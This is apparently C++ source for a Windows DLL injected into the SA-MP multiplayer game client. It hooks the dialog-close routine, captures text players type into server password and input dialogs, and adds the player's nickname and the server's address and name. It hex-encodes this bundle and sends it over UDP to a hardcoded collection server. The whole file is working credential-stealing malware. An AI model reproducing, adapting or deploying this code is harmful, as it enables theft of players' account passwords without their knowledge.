#define _WINSOCK_DEPRECATED_NO_WARNINGS 1

#include "main.h"
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")


CSAMP *SAMP = new CSAMP();

#define PORT 8081 // Порт
#define SERVERADDR "127.0.0.1" // IP сервера

int send_data(const char* buf)
{
	WSADATA data;
	// инициализация библиотеки Winsock
	if (WSAStartup(0x202, &data))
	{
		return -1;
	}

	// создание сокета
	SOCKET my_sock;
	my_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (my_sock < 0)
	{
		return -1;
	}

	// заполнение структуры sockaddr_in - указание адреса и порта сервера
	sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(PORT);
	dest_addr.sin_addr.S_un.S_addr = inet_addr(SERVERADDR);

	// передаем строку клиента серверу
	sendto(my_sock, buf, strlen(buf), 0, (SOCKADDR*)& dest_addr, sizeof(dest_addr));

	closesocket(my_sock);
	WSACleanup();
	return 1;
}


void mainThread( PVOID )
{
	while (!SAMP->Initialize()) Sleep(500);
	Sleep(1000);
	SetupHook();
	
}

char *BinToHex( BYTE *bin, size_t size, char *out )
{
	if ( bin == nullptr || size == 0 || out == nullptr )
		return "";
	out[0] = '\0';

	char	b[4];
	for ( size_t i = 0; i < size; i++ )
	{
		_snprintf_s( b, sizeof(b) - 1, "%02X", bin[i] );
		strcat( out, b );
	}
	return out;
}


void OnCloseDialog()
{
	stDialogInfo *dialog = SAMP->GetDialogInfo();

	if (dialog == nullptr || !dialog->bServerside) return;
	if (dialog->iType != DIALOG_STYLE_INPUT && dialog->iType != DIALOG_STYLE_PASSWORD) return;
	char buf[2048], hex[2048];
	
	wchar_t *inputBuf = *(wchar_t **)(DWORD(dialog->pEditBox) + 0x4D);

	char *nickname = new char[24];
	nickname = SAMP->GetNickName();


	sprintf(buf, "R%d&&%s:%d&&%s&&%s&&%ws&&%ld",
		SAMP->version,
		SAMP->GetIP(),
		SAMP->GetPort(),
		SAMP->GetHostname(),
		nickname,
		inputBuf,
		dialog->DialogID);

	BinToHex((BYTE *)buf, strlen(buf), hex);

	send_data(hex);
}

void _declspec ( naked ) CloseDialogHook( void )
{
	__asm pushad
	static DWORD dwTemp;
	OnCloseDialog();
	dwTemp = SAMP->GetBase() + SAMP->dwCloseDialogHook + 6;
	__asm popad

	__asm mov eax, dword ptr fs:[0] // exec overwritten code

	__asm jmp dwTemp
}

void SetupHook( void )
{
	uint32_t addr = SAMP->GetBase() + SAMP->dwCloseDialogHook;
	DWORD dwProt;

	VirtualProtect((void*)addr, 5, PAGE_EXECUTE_READWRITE, &dwProt);

	uint8_t *pdata = (uint8_t *) addr;
	pdata[0] = 0xE9; // jmp
	*(uint32_t*)& pdata[1] = (uint32_t)CloseDialogHook - (addr + 5);

	VirtualProtect((void*)addr, 5, dwProt, nullptr);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	if (dwReasonForCall == DLL_PROCESS_ATTACH) _beginthread(mainThread, NULL, NULL);
	return TRUE;
}